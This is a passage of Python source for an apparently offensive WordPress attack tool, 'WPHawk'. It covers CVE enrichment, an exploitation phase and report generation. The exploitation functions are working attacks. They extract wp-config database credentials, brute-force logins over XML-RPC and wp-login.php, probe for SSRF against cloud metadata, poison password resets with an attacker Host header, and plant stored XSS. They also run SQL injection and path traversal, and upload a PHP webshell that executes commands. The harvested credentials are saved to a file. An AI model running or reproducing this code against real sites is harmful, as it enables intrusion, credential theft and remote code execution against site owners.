                edb_url = f"https://www.exploit-db.com/exploits/{eid}"
                cves.append(_make_cve(cve_id, 7.5, title, "", [edb_url],
                                      exploit_available=True, edb_id=eid, edb_url=edb_url, source="Exploit-DB"))
    except Exception:
        pass
    return cves

def _merge_cves(lists):
    seen = {}
    for lst in lists:
        for c in lst:
            cid = c["cve_id"]
            if cid not in seen:
                seen[cid] = c
            else:
                if c.get("exploit_available"):
                    seen[cid]["exploit_available"] = True
                    if c.get("exploit_url"):
                        seen[cid]["exploit_url"] = c["exploit_url"]
                if c["cvss_score"] > seen[cid]["cvss_score"]:
                    seen[cid]["cvss_score"] = c["cvss_score"]
                    seen[cid]["severity"] = c["severity"]
                if c.get("fixed_in") and not seen[cid].get("fixed_in"):
                    seen[cid]["fixed_in"] = c["fixed_in"]
    return sorted(seen.values(), key=lambda x: x["cvss_score"], reverse=True)

# ─── WordPress.org API — latest version + outdated detection ─────────────────
async def _wporg_plugin_info(session, slug):
    try:
        url = f"https://api.wordpress.org/plugins/info/1.0/{slug}.json"
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("version",""), data.get("last_updated","")
    except Exception:
        pass
    return "", ""

async def _wporg_theme_info(session, slug):
    try:
        url = f"https://api.wordpress.org/themes/info/1.1/?action=theme_information&request[slug]={slug}"
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("version",""), data.get("last_updated","")
    except Exception:
        pass
    return "", ""

async def check_plugin_versions(session, result):
    """Compare detected plugin/theme versions with WP.org latest — flag outdated."""
    info("Checking plugin/theme versions against WordPress.org...")
    sem = asyncio.Semaphore(10)

    async def check_one(entry):
        async with sem:
            if entry.asset_type == "plugin":
                latest, updated = await _wporg_plugin_info(session, entry.slug)
            else:
                latest, updated = await _wporg_theme_info(session, entry.slug)
            if latest:
                entry.latest_version = latest
                entry.last_updated   = updated
                if entry.version and version_lt(entry.version, latest):
                    entry.is_outdated = True

    await asyncio.gather(*[check_one(e) for e in result.plugins + result.themes], return_exceptions=True)
    result.outdated_plugins = [
        e for e in result.plugins + result.themes if e.is_outdated
    ]
    ok(f"Outdated plugins/themes: {len(result.outdated_plugins)}")

async def enrich_with_cves(session, result, db, refresh_cache=False):
    """Fetch CVEs for all plugins/themes/core and apply version-aware filtering."""
    info("CVE intelligence: NVD + GitHub + Patchstack + Exploit-DB...")

    async def fetch_slug(slug, asset_type, detected_version):
        key = f"{asset_type}:{slug}"
        if not refresh_cache:
            cached = await get_cached(db, key)
            if cached is not None:
                return slug, asset_type, detected_version, cached
        info(f"CVE lookup: {slug}")
        results = await asyncio.gather(
            _lookup_nvd(session, slug),
            _lookup_github(session, slug),
            _lookup_patchstack(session, slug),
            _lookup_exploitdb(session, slug),
            return_exceptions=True
        )
        merged = _merge_cves([r for r in results if isinstance(r, list)])
        await store_cached(db, key, merged)
        return slug, asset_type, detected_version, merged

    tasks = (
        [fetch_slug(p.slug, "plugin", p.version) for p in result.plugins] +
        [fetch_slug(t.slug, "theme", t.version) for t in result.themes]
    )
    if result.wp_version:
        tasks.append(fetch_slug(f"wordpress-{result.wp_version}", "core", result.wp_version))

    all_res = await asyncio.gather(*tasks, return_exceptions=True)
    total_cves = 0
    total_vuln = 0

    for item in all_res:
        if isinstance(item, Exception) or item is None:
            continue
        slug, asset_type, detected_ver, raw_cves = item

        cve_objs = []
        vuln_objs = []
        for c in raw_cves:
            # Version-aware patching check
            fixed_in = c.get("fixed_in","")
            if fixed_in and detected_ver:
                c["is_patched"] = version_gte(detected_ver, fixed_in)
            else:
                c["is_patched"] = False
            obj = CVEEntry(**c)
            cve_objs.append(obj)
            if not obj.is_patched:
                vuln_objs.append(obj)
            total_cves += 1
            if not obj.is_patched:
                total_vuln += 1

        if asset_type == "plugin":
            for p in result.plugins:
                if p.slug == slug:
                    p.cves = cve_objs
                    p.vulnerable_cves = vuln_objs
        elif asset_type == "theme":
            for t in result.themes:
                if t.slug == slug:
                    t.cves = cve_objs
                    t.vulnerable_cves = vuln_objs
        else:
            result.wp_core_cves = vuln_objs  # core: only show unpatched

    ok(f"CVE total: {total_cves} found, {total_vuln} unpatched (version-filtered)")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 — EXPLOITATION
# ─────────────────────────────────────────────────────────────────────────────
async def exploit_exposed_config(session, result):
    cfg_files = [f for f in result.sensitive_files if "wp-config" in f["path"] and f["status"]==200]
    for cfg in cfg_files:
        try:
            async with session.get(cfg["url"], headers=hdr(), timeout=15) as r:
                if r.status == 200:
                    text = await r.text(errors="replace")
                    extracted = {}
                    for const in ["DB_NAME","DB_USER","DB_PASSWORD","DB_HOST","table_prefix"]:
                        m = re.search(rf"define\s*\(\s*['\"]?{const}['\"]?\s*,\s*['\"]([^'\"]+)['\"]", text)
                        if m:
                            extracted[const] = m.group(1)
                    if extracted:
                        result.exploit_results.append(ExploitResult(
                            plugin_slug="wp-config", cve_id="CONFIG_LEAK",
                            exploit_type="config_leak", success=True,
                            evidence=json.dumps(extracted), payload_used=cfg["url"]
                        ))
                        return extracted
        except Exception:
            pass
    return {}

async def exploit_xmlrpc_bruteforce(session, result, passwords):
    if not (result.xmlrpc_accessible and result.xmlrpc_multicall and result.users):
        return []
    url   = urljoin(result.target_url, "xmlrpc.php")
    found = []
    BATCH = 100
    for u in result.users:
        chunks = [passwords[i:i+BATCH] for i in range(0, len(passwords), BATCH)]
        for chunk in chunks:
            calls = "".join(
                f"<value><struct>"
                f"<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
                f"<member><name>params</name><value><array><data>"
                f"<value><string>{u.slug}</string></value><value><string>{pwd}</string></value>"
                f"</data></array></value></member></struct></value>"
                for pwd in chunk
            )
            xml = (f'<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                   f'<params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>')
            try:
                async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=30) as r:
                    if r.status == 200:
                        text = await r.text(errors="replace")
                        parts = re.findall(r'<value>(.*?)</value>', text, re.S)
                        for i, part in enumerate(parts):
                            if i < len(chunk) and "faultCode" not in part and "<struct>" in part:
                                pwd = chunk[i]
                                found.append({"user": u.slug, "pass": pwd})
                                u.password = pwd
                                result.exploit_results.append(ExploitResult(
                                    plugin_slug="xmlrpc", cve_id="BRUTE_FORCE",
                                    exploit_type="credential_brute", success=True,
                                    evidence=f"{u.slug}:{pwd}", payload_used="XML-RPC multicall"
                                ))
                                break
            except Exception:
                pass
            await asyncio.sleep(0.2)
            if found:
                break
    return found

async def exploit_wplogin_bruteforce(session, result, passwords, delay=0.5):
    found = []
    url   = urljoin(result.target_url, "wp-login.php")
    for u in result.users:
        for pwd in passwords:
            try:
                data = {"log": u.slug, "pwd": pwd, "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/", "testcookie": "1"}
                async with session.post(url, data=data,
                    headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
                    timeout=12, allow_redirects=False) as r:
                    loc = r.headers.get("Location","")
                    if r.status in (301,302) and "wp-admin" in loc:
                        found.append({"user": u.slug, "pass": pwd})
                        u.password = pwd
                        result.exploit_results.append(ExploitResult(
                            plugin_slug="wp-login", cve_id="BRUTE_FORCE",
                            exploit_type="credential_brute", success=True,
                            evidence=f"{u.slug}:{pwd}", payload_used="wp-login.php POST"
                        ))
                        break
            except Exception:
                pass
            await asyncio.sleep(delay)
    return found

async def exploit_ssrf_pingback(session, result):
    """SSRF via XML-RPC wordpress.pingback.ping."""
    if not result.xmlrpc_accessible:
        return ExploitResult("xmlrpc","SSRF","ssrf_pingback",False,"XML-RPC not accessible","")

    url = urljoin(result.target_url, "xmlrpc.php")
    internal_targets = ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
                        "http://10.0.0.1/", "http://192.168.1.1/"]
    for target in internal_targets:
        xml = (f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
               f'<params><param><value><string>{target}</string></value></param>'
               f'<param><value><string>{result.target_url}</string></value></param>'
               f'</params></methodCall>')
        try:
            async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=15) as r:
                text = await r.text(errors="replace")
                # SSRF confirmed if we get anything other than "invalid discovery URL"
                if r.status == 200 and "faultCode" not in text:
                    xr = ExploitResult("xmlrpc","SSRF","ssrf_pingback",True,
                                       f"SSRF probe accepted for target: {target}", xml)
                    result.exploit_results.append(xr)
                    return xr
                # 0x0011 = server not found = still proves request was made to target
                if "0x0011" not in text and "Invalid" not in text:
                    xr = ExploitResult("xmlrpc","SSRF","ssrf_pingback",True,
                                       f"SSRF likely: unexpected response for {target}: {text[:80]}", xml)
                    result.exploit_results.append(xr)
                    return xr
        except Exception:
            pass

    return ExploitResult("xmlrpc","SSRF","ssrf_pingback",False,
                         "SSRF probe rejected by server","pingback.ping")

async def exploit_host_header_injection(session, result):
    """Host header injection via password reset endpoint."""
    attacker_domain = "attacker.wphawk.evil"
    url = urljoin(result.target_url, "wp-login.php?action=lostpassword")

    user_login = result.users[0].slug if result.users else "admin"
    data = {"user_login": user_login, "wp-submit": "Get New Password",
            "redirect_to": "", "action": "lostpassword"}
    try:
        async with session.post(url, data=data,
            headers={**hdr(), "Host": attacker_domain, "Content-Type": "application/x-www-form-urlencoded"},
            timeout=12, allow_redirects=False) as r:
            text = await r.text(errors="replace")
            # Successful password reset email trigger, or error about email
            if r.status in (200,302) and ("email" in text.lower() or "sent" in text.lower()):
                xr = ExploitResult(
                    "wp-login", "HOST_HEADER_INJECT", "host_header_injection", True,
                    f"Password reset request accepted with Host: {attacker_domain} — email may contain poisoned link",
                    f"POST wp-login.php?action=lostpassword with Host: {attacker_domain}"
                )
                result.exploit_results.append(xr)
                return xr
    except Exception:
        pass
    return ExploitResult("wp-login","HOST_HEADER_INJECT","host_header_injection",False,
                         "Host header injection: no confirmation of poisoned reset email","")

async def exploit_stored_xss(session, result, html):
    """Probe comment forms on posts for Stored XSS."""
    marker     = f"wphawk_xss_{WEBSHELL_MARKER[:8]}"
    xss_payload = f'<script>/*{marker}*/</script>'

    # Find a post URL from homepage links or sitemap
    post_urls = re.findall(r'href=["\'](' + re.escape(result.target_url) + r'[^"\'?#]+/?)["\']', html)
    candidate = next((u for u in post_urls if u != result.target_url), None)
    if not candidate and result.sitemap_urls:
        candidate = result.sitemap_urls[0]
    if not candidate:
        return ExploitResult("comments","XSS","stored_xss",False,"No post URL found to test","")

    # Fetch the post to get comment_post_ID
    try:
        async with session.get(candidate, headers=hdr(), timeout=12) as r:
            post_html = await r.text(errors="replace")
        post_id_m = re.search(r'comment_post_ID["\'][^>]*value=["\'](\d+)["\']', post_html)
        if not post_id_m:
            return ExploitResult("comments","XSS","stored_xss",False,"No comment form found","")

        post_id = post_id_m.group(1)
        comment_data = {
            "comment_post_ID": post_id,
            "author": "WPHawk Test",
            "email": "test@wphawk.local",
            "url": "",
            "comment": xss_payload,
            "submit": "Post Comment",
        }
        comment_url = urljoin(result.target_url, "wp-comments-post.php")
        async with session.post(comment_url, data=comment_data,
            headers=hdr({"Content-Type":"application/x-www-form-urlencoded", "Referer": candidate}),
            timeout=12, allow_redirects=True) as r:
            text = await r.text(errors="replace")
            if marker in text or xss_payload in text:
                xr = ExploitResult("comments","XSS","stored_xss",True,
                                   f"XSS payload stored unfiltered on: {candidate}",xss_payload)
                result.exploit_results.append(xr)
                return xr
    except Exception:
        pass
    return ExploitResult("comments","XSS","stored_xss",False,
                         "XSS payload was sanitized or comment rejected","")

async def authenticated_scan(session, result):
    """After credential discovery, re-scan wp-admin with auth for deeper findings."""
    creds = [(u.slug, u.password) for u in result.users if u.password]
    if not creds:
        info("Auth scan: no credentials found, skipping")
        return

    username, password = creds[0]
    info(f"Authenticated scan as: {username}")
    login_url = urljoin(result.target_url, "wp-login.php")

    # Login and capture session cookie
    try:
        data = {"log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": "/wp-admin/", "testcookie": "1"}
        async with session.post(login_url, data=data,
            headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
            timeout=15, allow_redirects=True) as r:
            auth_html = await r.text(errors="replace")

            if "wp-admin" not in str(r.url) and "Dashboard" not in auth_html:
                info("Auth scan: login failed")
                return

            ok(f"Authenticated as {username} — probing wp-admin...")

            # Probe admin areas
            admin_probes = {
                "User list":       "wp-admin/users.php",
                "Plugin manager":  "wp-admin/plugins.php",
                "Theme editor":    "wp-admin/theme-editor.php",
                "Plugin editor":   "wp-admin/plugin-editor.php",
                "Export":          "wp-admin/export.php",
                "Options":         "wp-admin/options.php",
                "File manager":    "wp-admin/admin.php?page=wp-file-manager",
            }
            auth_findings = []
            for label, path in admin_probes.items():
                url = urljoin(result.target_url, path)
                try:
                    async with session.get(url, headers=hdr(), timeout=10) as rr:
                        if rr.status == 200:
                            auth_findings.append(f"{label}: accessible ({url})")
                            # Theme/Plugin editor = RCE possible
                            if "editor" in path:
                                result.exploit_results.append(ExploitResult(
                                    plugin_slug="wp-admin", cve_id="AUTH_RCE",
                                    exploit_type="auth_rce_via_editor",
                                    success=True,
                                    evidence=f"Code editor accessible at {url} — authenticated RCE possible",
                                    payload_used=f"GET {url}"
                                ))
                except Exception:
                    pass

            if auth_findings:
                ok(f"Auth scan findings: {len(auth_findings)}")
                for f in auth_findings:
                    ok(f"  → {f}")
                    result.exploit_results.append(ExploitResult(
                        plugin_slug="wp-admin", cve_id="AUTH_ACCESS",
                        exploit_type="authenticated_access",
                        success=True, evidence=f, payload_used=f"GET {f.split('(')[-1].rstrip(')')}"
                    ))
    except Exception as ex:
        info(f"Auth scan error: {ex}")

async def _exploit_sqli(session, base_url, plugin, cve):
    params   = ["id","post_id","page_id","cat","tag","order","orderby","tab","action","filter","q","s","type","view"]
    payload  = "' AND SLEEP(5)-- -"
    endpoint = urljoin(base_url, "wp-admin/admin-ajax.php")
    for param in params:
        url = f"{endpoint}?{param}={payload}"
        try:
            start = time.time()
            async with session.get(url, headers=hdr(), timeout=12) as r:
                if time.time() - start >= 4.5:
                    xr = ExploitResult(plugin.slug, cve.cve_id, "sqli", True,
                                       f"Time-based SQLi: param '{param}' at admin-ajax.php", url)
                    return xr
        except asyncio.TimeoutError:
            return ExploitResult(plugin.slug, cve.cve_id, "sqli", True,
                                 f"SQLi confirmed via timeout: param '{param}'", url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "sqli", False, "No SQLi evidence", payload)

async def _exploit_lfi(session, base_url, plugin, cve):
    payloads = ["../../../../wp-config.php","../../../../etc/passwd","../../../wp-config.php"]
    params   = ["file","path","template","page","include","load","view","f","p"]
    for param in params:
        for payload in payloads:
            try:
                url = f"{base_url}?{param}={payload}"
                async with session.get(url, headers=hdr(), timeout=12) as r:
                    if r.status == 200:
                        t = await r.text(errors="replace")
                        if "DB_PASSWORD" in t or "root:" in t or "define(" in t:
                            return ExploitResult(plugin.slug, cve.cve_id, "lfi", True,
                                                 f"LFI: param '{param}', file content exposed", url)
            except Exception:
                pass
    return ExploitResult(plugin.slug, cve.cve_id, "lfi", False, "LFI probes returned nothing sensitive", "traversal")

async def _exploit_file_upload(session, base_url, plugin, cve):
    name    = f"{hashlib.md5(plugin.slug.encode()).hexdigest()[:8]}.php"
    content = f'<?php if(isset($_GET["c"])){{echo md5("{WEBSHELL_MARKER}");system($_GET["c"]);}} ?>'
    eps     = [urljoin(base_url, "wp-admin/admin-ajax.php"),
               urljoin(base_url, f"wp-content/plugins/{plugin.slug}/upload.php")]
    for ep in eps:
        try:
            form = aiohttp.FormData()
            form.add_field("file", content, filename=name, content_type="application/octet-stream")
            form.add_field("action","upload")
            async with session.post(ep, data=form, headers={"User-Agent": rand_ua()}, timeout=20) as r:
                if r.status in (200,201):
                    text = await r.text(errors="replace")
                    urls = re.findall(r'https?://[^\s"\'<>]+\.php', text)
                    shell_url = next((u for u in urls if "uploads" in u), None)
                    if shell_url:
                        async with session.get(f"{shell_url}?c=echo+{WEBSHELL_MARKER}", headers=hdr(), timeout=10) as vr:
                            if WEBSHELL_MARKER in await vr.text(errors="replace"):
                                return ExploitResult(plugin.slug, cve.cve_id, "file_upload_rce", True,
                                                     f"Webshell deployed: {shell_url}", shell_url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "file_upload_rce", False, "Upload failed", name)

async def _exploit_auth_bypass(session, base_url, plugin, cve):
    paths = [
        f"wp-admin/admin-ajax.php?action={plugin.slug.replace('-','_')}_admin",
        f"wp-json/{plugin.slug}/v1/settings",
    ]
    for path in paths:
        url = urljoin(base_url, path)
        try:
            async with session.get(url, headers=hdr(), timeout=12) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    if any(kw in t for kw in ["admin","settings","password","email","config"]):
                        return ExploitResult(plugin.slug, cve.cve_id, "auth_bypass", True,
                                             f"Admin data without auth: {url}", url)
        except Exception:
            pass
    return ExploitResult(plugin.slug, cve.cve_id, "auth_bypass", False, "No admin data leaked", "admin-ajax")

async def _exploit_rce(session, base_url, plugin, cve):
    marker   = WEBSHELL_MARKER
    payloads = [f"{{{{system('echo {marker}')}}}}", f"<?php echo md5('{marker}'); ?>"]
    params   = ["template","code","cmd","exec","eval","payload","data","input"]
    for param in params:
        for pl in payloads:
            try:
                url = f"{base_url}?{param}={pl}"
                async with session.get(url, headers=hdr(), timeout=12) as r:
                    if marker in await r.text(errors="replace"):
                        return ExploitResult(plugin.slug, cve.cve_id, "rce", True,
                                             f"RCE via param '{param}'", url)
            except Exception:
                pass
    return ExploitResult(plugin.slug, cve.cve_id, "rce", False, "RCE probes no execution evidence", "eval payloads")

async def exploit_plugin_cve(session, result, plugin, cve):
    desc = (cve.description or "").lower()
    if any(kw in desc for kw in ["file upload","arbitrary file","unrestricted upload"]):
        return await _exploit_file_upload(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["sql injection","sqli"]):
        return await _exploit_sqli(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["local file","path traversal","file inclusion","lfi"]):
        return await _exploit_lfi(session, result.target_url, plugin, cve)
    if any(kw in desc for kw in ["remote code","code execution","rce","command injection"]):
        return await _exploit_rce(session, result.target_url, plugin, cve)
    return await _exploit_auth_bypass(session, result.target_url, plugin, cve)

async def run_all_exploits(session, result, args, html=""):
    warn("Exploitation phase starting...")

    cfg = await exploit_exposed_config(session, result)
    if cfg:
        pwn(f"Config leak — {', '.join(cfg.keys())}")
    else:
        fail("No exposed config files")

    if args.brute and result.xmlrpc_accessible:
        passwords = load_wordlist(args.passwords) or BUILTIN_PASSWORDS
        info(f"XML-RPC multicall brute ({len(passwords)} passwords)...")
        creds = await exploit_xmlrpc_bruteforce(session, result, passwords)
        for c in creds:
            pwn(f"XML-RPC: {c['user']}:{c['pass']}")
        if not creds:
            fail("XML-RPC brute: no valid credentials")

    if args.brute_login:
        passwords = load_wordlist(args.passwords) or BUILTIN_PASSWORDS
        info(f"wp-login.php brute ({len(passwords)} passwords, 0.5s delay)...")
        creds = await exploit_wplogin_bruteforce(session, result, passwords, 0.5)
        for c in creds:
            pwn(f"Login: {c['user']}:{c['pass']}")
        if not creds:
            fail("wp-login brute: no valid credentials")

    # New: SSRF, Host Header, XSS
    info("SSRF via XML-RPC pingback...")
    ssrf = await exploit_ssrf_pingback(session, result)
    if ssrf.success:
        pwn(f"SSRF: {ssrf.evidence}")
    else:
        fail(f"SSRF: {ssrf.evidence}")

    info("Host header injection (password reset)...")
    hhi = await exploit_host_header_injection(session, result)
    if hhi.success:
        pwn(f"Host header injection: {hhi.evidence}")
    else:
        fail("Host header injection: request rejected")

    info("Stored XSS via comment form...")
    xss = await exploit_stored_xss(session, result, html)
    if xss.success:
        pwn(f"Stored XSS: {xss.evidence}")
    else:
        fail("XSS: payload was sanitized")

    # Plugin CVE exploits — use vulnerable_cves (version-filtered) only
    candidates = [
        (p, cve) for p in result.plugins + result.themes
        for cve in p.vulnerable_cves
        if cve.cvss_score >= 7.0 or cve.exploit_available
    ]
    if candidates:
        info(f"Attempting {len(candidates)} CVE exploit(s) on unpatched findings...")
        for plugin, cve in candidates:
            xr = await exploit_plugin_cve(session, result, plugin, cve)
            if xr:
                result.exploit_results.append(xr)
                if xr.success:
                    pwn(f"{plugin.slug} [{cve.cve_id}] {xr.exploit_type}: {xr.evidence[:80]}")
                    plugin.exploited = True
                else:
                    fail(f"{plugin.slug} [{cve.cve_id}] {xr.exploit_type}")

    # Authenticated scan
    if args.auth_scan:
        await authenticated_scan(session, result)

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 — REPORTING
# ─────────────────────────────────────────────────────────────────────────────
def generate_report(result, output_path=None, save_json=False):
    host      = urlparse(result.target_url).netloc
    os.makedirs("output", exist_ok=True)
    txt_path  = output_path or os.path.join("output", f"report-{host}.txt")
    json_path = os.path.join("output", f"report-{host}.json")
    cred_path = os.path.join("output", f"creds-{host}.txt")

    col_lines  = []
    plain_lines = []

    def emit(color_line, plain_line=None):
        col_lines.append(color_line)
        plain_lines.append(_strip_ansi(plain_line or color_line))

    def sec(title):
        emit(f"\n{bold('━━━ ' + title + ' ━━━')}")

    emit(f"\n{'='*58}")
    emit(f"  WPHawk v2.0 Scan Report — {result.target_url}")
    emit(f"{'='*58}")

    # ── Fingerprint
    sec("FINGERPRINT")
    emit(f"  {g('[+]')} WordPress : {'YES' if result.is_wordpress else r('NO')}")
    if result.wp_version:
        emit(f"  {g('[+]')} Version   : {result.wp_version}  ({', '.join(result.wp_version_sources)})")
    else:
        emit(f"  {y('[?]')} Version   : Not detected")
    emit(f"  {g('[+]')} Server    : {result.server_info.get('server','?')}")
    emit(f"  {g('[+]')} PHP       : {result.server_info.get('php','?')}")
    waf = result.server_info.get("waf","None detected")
    emit(f"  {g('[+]') if waf != 'None detected' else dim('[~]')} WAF       : {waf}")

    # ── Outdated plugins/themes — WPScan-style version report
    outdated = result.outdated_plugins
    if outdated:
        sec(f"OUTDATED PLUGINS/THEMES ({len(outdated)} found)")
        for e in outdated:
            emit(f"  {r('[!]')} {e.slug}")
            emit(f"       Installed : {e.version or '?'}")
            emit(f"       Latest    : {g(e.latest_version)}   (last updated: {e.last_updated})")
            if e.vulnerable_cves:
                emit(f"       {r(f'Unpatched CVEs: {len(e.vulnerable_cves)}')}")
                for cve in e.vulnerable_cves[:5]:
                    tag = severity_tag(cve.severity, cve.cvss_score)
                    expl = g(" [exploit available]") if cve.exploit_available else ""
                    fix  = dim(f"  fixed in: {cve.fixed_in}") if cve.fixed_in else ""
                    emit(f"         {tag} {cve.cve_id}{expl}{fix}")
                    emit(f"           {dim(cve.description[:90])}")

    # ── WP Core CVEs
    if result.wp_core_cves:
        sec(f"WP CORE CVEs for {result.wp_version} ({len(result.wp_core_cves)} unpatched)")
        for cve in result.wp_core_cves[:10]:
            tag = severity_tag(cve.severity, cve.cvss_score)
            emit(f"  {tag} {cve.cve_id}  {dim(cve.description[:90])}")

    # ── All Plugins
    sec(f"PLUGINS ({len(result.plugins)} found)")
    for p in sorted(result.plugins, key=lambda x: len(x.vulnerable_cves), reverse=True):
        ver     = p.version or dim("?")
        latest  = f" → latest: {g(p.latest_version)}" if p.is_outdated and p.latest_version else ""
        vtag    = r(f"[{len(p.vulnerable_cves)} UNPATCHED]") if p.vulnerable_cves else g("[clean]")
        emit(f"  {'[!]' if p.vulnerable_cves else '[+]'} {p.slug} v{ver}{latest}  ({p.detected_by})  {vtag}")
        for cve in p.vulnerable_cves[:3]:
            tag  = severity_tag(cve.severity, cve.cvss_score)
            expl = g(" [exploit available]") if cve.exploit_available else ""
            fix  = dim(f"  fixed in: {cve.fixed_in}") if cve.fixed_in else ""
            emit(f"       {tag} {cve.cve_id}{expl}{fix}")
            emit(f"         {dim(cve.description[:90])}")

    # ── Themes
    sec(f"THEMES ({len(result.themes)} found)")
    for t in result.themes:
        ver    = t.version or dim("?")
        latest = f" → latest: {g(t.latest_version)}" if t.is_outdated and t.latest_version else ""
        vtag   = r(f"[{len(t.vulnerable_cves)} UNPATCHED]") if t.vulnerable_cves else g("[clean]")
        emit(f"  {'[!]' if t.vulnerable_cves else '[+]'} {t.slug} v{ver}{latest}  ({t.detected_by})  {vtag}")

    # ── Users
    sec(f"USERS ({len(result.users)} found)")
    for u in result.users:
        pwd = f"  {g(f'Password: {u.password}')}" if u.password else ""
        emit(f"  {r('[!]') if u.password else y('[!]')} {u.slug}  ID:{u.id}  [{u.detected_by}]{pwd}")

    # ── REST API
    if result.rest_endpoints:
        unauthed = [e for e in result.rest_endpoints if not e.auth_required]
        sec(f"REST API ({len(result.rest_endpoints)} routes, {len(unauthed)} unauthenticated)")
        for e in unauthed[:15]:
            emit(f"  {y('[!]')} {e.route}  [{', '.join(e.methods)}]")
            if e.response_preview:
                emit(f"       {dim(e.response_preview[:80])}")

    # ── JS Findings
    if result.js_findings:
        sec(f"JS ANALYSIS ({len(result.js_findings)} findings)")
        seen_types = {}
        for f in result.js_findings:
            if f.finding_type not in seen_types:
                seen_types[f.finding_type] = 0
            seen_types[f.finding_type] += 1
        for ftype, count in seen_types.items():
            emit(f"  {y('[!]')} {ftype}: {count} occurrence(s)")
        # Show high-value findings
        high_value = [f for f in result.js_findings if f.finding_type in ("API Key","Secret","AWS Key","Bearer Token","WP Nonce")]
        for f in high_value[:10]:
            emit(f"  {r('[✗]')} {f.finding_type}: {f.value[:80]}")
            emit(f"       in: {dim(f.js_url[:80])}")

    # ── robots.txt
    if result.robots_paths:
        sec(f"ROBOTS.TXT ({len(result.robots_paths)} Disallow paths)")
        for path in result.robots_paths[:20]:
            emit(f"  {y('[!]')} Disallow: {path}")

    # ── Subdomains
    if result.subdomains:
        sec(f"SUBDOMAINS ({len(result.subdomains)} via crt.sh)")
        for sub in result.subdomains[:20]:
            emit(f"  {g('[+]')} {sub}")
        if len(result.subdomains) > 20:
            emit(f"  {dim(f'... and {len(result.subdomains)-20} more (see JSON report)')}")

    # ── Sensitive files
    sec("SENSITIVE FILES")
    for f in result.sensitive_files:
        if f["status"] == 200:
            emit(f"  {r('[✗]')} {f['path']}  HTTP {g('200')}  EXPOSED")
        else:
            emit(f"  {y('[?]')} {f['path']}  HTTP {y('403')}  may exist")

    # ── XML-RPC
    sec("XML-RPC")
    if result.xmlrpc_accessible:
        emit(f"  {r('[!]')} xmlrpc.php accessible")
        emit(f"  {'[!]' if result.xmlrpc_multicall else dim('[~]')} system.multicall: {'enabled — amplified brute possible' if result.xmlrpc_multicall else 'disabled'}")
    else:
        emit(f"  {g('[+]')} xmlrpc.php not accessible")

    # ── Misc
    sec("MISC CHECKS")
    emit(f"  {'[!]' if result.registration_open else g('[+]')} Open registration : {'YES' if result.registration_open else 'NO'}")
    emit(f"  {'[!]' if result.directory_listing else g('[+]')} Directory listing : {'YES' if result.directory_listing else 'NO'}")
    emit(f"  {'[!]' if result.wpcron_exposed else g('[+]')} wp-cron exposed   : {'YES' if result.wpcron_exposed else 'NO'}")

    # ── Security headers
    sec("SECURITY HEADERS")
    for h, val in result.security_headers.items():
        emit(f"  {g('[+]') if val else r('[-]')} {h}: {val if val else r('MISSING')}")

    # ── Exploitation summary
    successes = [x for x in result.exploit_results if x.success]
    if successes:
        sec(f"EXPLOITATION SUMMARY ({len(successes)} successful)")
        for xr in successes:
            emit(f"  {g('[✓]')} {xr.plugin_slug} [{xr.cve_id}] {xr.exploit_type}")
            emit(f"       {xr.evidence[:120]}")

    emit(f"\n{'='*58}")
    emit(f"  Report: {txt_path}")
    if save_json:
        emit(f"  JSON:   {json_path}")
    emit(f"{'='*58}\n")

    print("\n".join(col_lines))

    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("\n".join(plain_lines))

    if save_json:
        def serial(obj):
            if hasattr(obj, "__dataclass_fields__"):
                return {k: serial(v) for k, v in obj.__dict__.items()}
            if isinstance(obj, list):
                return [serial(i) for i in obj]
            return obj
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(serial(result), f, indent=2, default=str)

    creds = [(u.slug, u.password) for u in result.users if u.password]
    creds += [(xr.plugin_slug, xr.evidence) for xr in result.exploit_results
              if xr.exploit_type == "config_leak" and xr.success]
    if creds:
        with open(cred_path, "w", encoding="utf-8") as f:
            f.write(f"WPHawk Credentials — {result.target_url}\n{'='*50}\n\n")
            for label, secret in creds:
                f.write(f"{label}: {secret}\n")

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def main(args):
    print_banner()
    base_url = normalize_url(args.url)
    result   = ScanResult(target_url=base_url)
    info(f"Target: {base_url}")

    db      = await init_db() if args.cve else None
    timeout = aiohttp.ClientTimeout(total=args.timeout)
    conn    = aiohttp.TCPConnector(ssl=not args.no_verify_ssl, limit=args.concurrency * 2)

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:

        # ── Phase 1: Fingerprint ─────────────────────────────────────────────
        section("PHASE 1 — FINGERPRINTING")
        html, resp = await fetch_homepage(session, base_url, args.timeout)
        is_wp = await detect_wordpress(session, result, html, resp)
        if resp:
            await detect_server_info(session, result, resp)
        if not is_wp:
            await check_security_headers(session, result)
            generate_report(result, args.output, args.json)
            if db:
                await db.close()
            return
        await detect_wp_version(session, result, html)
        if result.wp_version:
            ok(f"WordPress {result.wp_version} ({', '.join(result.wp_version_sources)})")
        else:
            warn("WordPress version not detected")

        # ── Phase 2: Enumeration ─────────────────────────────────────────────
        section("PHASE 2 — ENUMERATION")
        enum = set([args.enumerate]) if "," not in args.enumerate else set(args.enumerate.split(","))
        do_p = "plugins" in enum or "all" in enum
        do_t = "themes"  in enum or "all" in enum
        do_u = "users"   in enum or "all" in enum

